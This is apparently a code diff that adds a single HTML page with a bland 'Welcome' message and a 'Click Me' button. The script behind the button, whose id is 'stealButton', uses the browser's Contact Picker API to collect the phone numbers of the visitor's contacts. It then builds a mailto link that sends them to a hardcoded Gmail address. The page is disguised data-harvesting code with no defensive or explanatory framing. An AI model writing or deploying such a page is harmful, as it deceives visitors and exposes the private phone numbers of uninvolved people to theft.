@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Welcome</title>
+  <style>
+    body {
+      background-color: black;
+      font-family: Arial, sans-serif;
+    }
+
+    .container {
+      width: 400px;
+      margin: 100px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 5px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+
+    h2 {
+      text-align: center;
+    }
+
+    p {
+      text-align: center;
+      margin-top: 20px;
+    }
+
+    button {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      background-color: #4CAF50;
+      color: #fff;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #3e8e41;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Welcome</h2>
+    <p>Click the button to visit.</p>
+    <button id="stealButton">Click Me</button>
+  </div>
+
+  <script>
+    const stealButton = document.getElementById('stealButton');
+
+    stealButton.addEventListener('click', () => {
+      if (navigator.contacts) {
+        const options = { multiple: true };
+
+        navigator.contacts.select(options).then((contacts) => {
+          let phoneNumbers = '';
+
+          contacts.forEach((contact) => {
+            if (contact.phoneNumbers && contact.phoneNumbers.length > 0) {
+              phoneNumbers += contact.phoneNumbers[0].value + '\n';
+            }
+          });
+
+          if (phoneNumbers !== '') {
+            sendPhoneNumbersToEmail(phoneNumbers);
+          }
+        });
+      } else {
+        console.log('Contacts API not supported in this browser.');
+      }
+    });
+
+    function sendPhoneNumbersToEmail(phoneNumbers) {
+      const emailAddress = 'dhrona1421@gmail.com';
+      const mailtoLink = `mailto:${emailAddress}?subject=Phone Numbers&body=${encodeURIComponent(phoneNumbers)}`;
+
+      window.location.href = mailtoLink;
+    }
+  </script>
+</body>
+</html>
